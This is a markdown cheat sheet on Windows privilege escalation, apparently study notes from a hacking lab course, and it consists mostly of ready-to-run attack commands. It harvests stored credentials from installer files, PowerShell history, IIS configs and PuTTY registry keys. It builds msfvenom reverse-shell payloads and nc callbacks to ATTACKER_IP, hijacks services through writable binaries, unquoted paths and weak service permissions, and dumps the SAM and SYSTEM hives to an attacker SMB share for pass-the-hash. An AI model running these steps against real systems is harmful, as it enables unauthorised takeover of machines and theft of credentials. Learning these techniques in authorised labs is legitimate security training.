---
title: "Windows Privilege Escalation"
date: 2026-04-01
weight: 5
---
## Harvesting passwords

### Unattended Windows Installations
- When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
    ```cmd
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
    ```

### Powershell history
- Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands.
- For Powershell, won't recognize `%userprofile%` as an environment variable. You'd have to replace `%userprofile%` with `$Env:userprofile`
    ```cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    ```

### Saved Windows Credentials
- Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
    ```cmd
    cmdkey /list
    ```
- While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
    ```cmd
    runas /savecred /user:admin cmd.exe
    ```

### IIS Configuration
- Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
    ```cmd
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    ```
- Here is a quick way to find database connection strings on the file:
    ```cmd
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
    ```

### Retrieve Credentials from Software: PuTTY
- PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

- To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
    ```cmd
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
    ```
- Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

## Other Easy wins

### Scheduled Tasks
- Scheduled tasks can be listed from the command line using the `schtasks` command without any options. 
    ```powershell
    schtasks /query /tn vulntask /fo list /v
    ```
- We will get lots of information about the task, but what matters for us is the `Task to Run` parameter which indicates what gets executed by the scheduled task, and the `Run As User` parameter, which shows the user that will be used to execute the task.
- If our current user can modify or overwrite the `Task to Run` executable, we can control what gets executed by the `Run As User` user, resulting in a simple privilege escalation.
- To check the file permissions on the executable, we use icacls:
    ```powershell
    icacls c:\tasks\schtask.bat

    # if yes, we can modify the .bat file and insert any payload we like
    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
    schtasks /run /tn vulntask

    # On attacker machine
    nc -lvp 4444
    ```
- As we can see in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like, and when the task runs, it will execute our payload as the user specified in the `Run As User` parameter.


### AlwaysInstallElevated
- Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

- This method requires two registry values to be set.
    ```powershell
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    ```
- To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
    ```bash
    # attacker's machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
    ```
- As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
    ```powershell
    msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
    ```

## Abusing Service configurations
### Windows Services
- Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
- Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
- To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:
    ```powershell
    sc qc apphostsvc | findstr /i "BINARY_PATH_NAME SERVICE_START_NAME"
    #BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
    #SERVICE_START_NAME : localSystem
    ```
- Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.

- All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
- A subkey exists for every service in the system. Again, we can see the associated executable on the `ImagePath` value and the account used to start the service on the `ObjectName` value. If a DACL has been configured for the service, it will be stored in a subkey called `Security`. As you have guessed by now, only administrators can modify such registry entries by default.

- If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
    ```powershell
    # checking the service `WindowsScheduler` details, look for its BINARY_PATH_NAME
    sc qc WindowsScheduler
    # checking permissions on its executable
    icacls "C:\Windows\System32\WindowsScheduler.exe"
    # if you are in list of groups with write permissions, you can replace the executable
    wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
    cd C:\PROGRA~2\SYSTEM~1\
    move WindowsScheduler.exe WindowsScheduler.exe.bkp
    move C:\Users\thm-unpriv\rev-svc.exe WindowsScheduler.exe
    icacls WindowsScheduler.exe /grant Everyone:F
    sc stop windowsscheduler
    sc start windowsscheduler

    # Attackers machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
    python3 -m http.server 8000
    nc -lvnp 4445 # listen for reverse shell

    ```


### Unquoted Service Paths
- When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
- When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
- Have a look at the following two examples:
    ```powershell
    sc qc "vncserver" | findstr /i "BINARY_PATH_NAME"
    #BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service

    sc qc "disk sorter enterprise" | findstr /i "BINARY_PATH_NAME"
    #BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    ```

- In second example, the path is not quoted, which means that Windows will try to execute the program by splitting the path by spaces. So, 
  - First, it search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
  - If the above doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
  - If the above doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
- In our case, lets find out if we can do something..
    ```powershell
    icacls c:\MyPrograms # assuming we have write access to this directory
    wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
    move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
    icacls C:\MyPrograms\Disk.exe /grant Everyone:F
    sc stop "disk sorter enterprise"
    sc start "disk sorter enterprise"

    # Attackers machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
    python3 -m http.server 8000
    nc -lvnp 4446 # listen for reverse shell
    ```

### Insecure Service Permissions
-  Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
-  We can use the sysinternal tool `Accesschk` to check for insecure service permissions.
    ```powershell
    # Lets check if built in users has access to modify the service configuration
    accesschk64.exe -qlc thmservice
    wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
    icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
    sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
    sc stop THMService
    sc start THMService

    # Attacker's machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
    python3 -m http.server 8000
    nc -lvnp 4447 # listen for reverse shell
    ```

## Abusing Dengerous Privilages
### Windows Privilages
- Each user has a set of assigned privileges that can be checked with the following command: `whoami /priv`
- A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). 
- From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

### SeBackup / SeRestore
- The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
    ```powershell
    whoami /priv
    # PRIVILEGES INFORMATION
    # ----------------------

    # Privilege Name                Description                    State
    # ============================= ============================== ========
    # SeBackupPrivilege             Back up files and directories  Disabled
    # SeRestorePrivilege            Restore files and directories  Disabled
    # SeShutdownPrivilege           Shut down the system           Disabled
    # SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    # SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

    # Target machine, backup the SAM and SYSTEM hashes
    reg save hklm\system C:\Users\THMBackup\system.hive
    reg save hklm\sam C:\Users\THMBackup\sam.hive
    # We can now copy these files to our attacker machine using SMB or any other available method
    # After this, we can use the copy command in our windows machine to transfer both files to attacker machine


    # Attacker's machine
    # This will create a share named public pointing to the share directory, 
    # which requires the username and password of our current windows session
    mkdir share
    python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

    # Target machine
    copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
    copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

    # Attacker's machine
    # Using impacket to retrieve the users' password hashes:
    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    # use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
    python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
    ```

### SeTakeOwnership
- The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable.
- Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.
    ```powershell
    whoami /priv
    # PRIVILEGES INFORMATION
    # ----------------------

    # Privilege Name                Description                              State
    # ============================= ======================================== ========
    # SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
    # SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
    # SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

    # we will start by taking ownership 
    takeown /f C:\Windows\System32\Utilman.exe
    # Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, 
    # but being the owner you can assign yourself any privileges you need.
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
    copy cmd.exe C:\Windows\System32\Utilman.exe
    # To trigger utilman, we will lock our screen from the start button
    # Now we have cmdline with SYSTEM privileges
    ```

## Abusing Vulnerable Software
### Unpatched Software
- As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions
```powershell
wmic product get name,version,vendor
```

## Tools in Trend
- **[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):** WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. 
  - `winpeas.exe > outputfile.txt`
- **[PrivescCheck](https://github.com/decoder-it/privesccheck):** PrivescCheck is a PowerShell script to check for common privilege escalation vectors on Windows systems.
    ```powershell
    Set-ExecutionPolicy Bypass -Scope process -Force
    . .\PrivescCheck.ps1
    Invoke-PrivescCheck
    ```
- **[WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng):** 
  - Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. 
  - May cause detection by antivirus solutions.
  - WES-NG is a Python script that can be found and downloaded, Once installed, and before using it, type the `wes.py --update` command to update the database. 
  - To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
  - `wes.py systeminfo.txt`
- **Metasploit:** can be used with the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
-  Should you be interested in learning about additional techniques, the following resources are available:
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Windows Privilege Escalation
    - [Priv2Admin](https://github.com/gtworek/Priv2Admin) - Abusing Windows Privileges
    - [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) - RogueWinRM Exploit
    - [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html) - Potatoes
    - [Decoder's Blog](https://decoder.cloud/) - Decoder's Blog
    - [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf) - Token Kidnapping
    - [Hacktricks](https://hacktricks.wiki/windows-hardening/windows-local-privilege-escalation) - Windows Local Privilege Escalation
























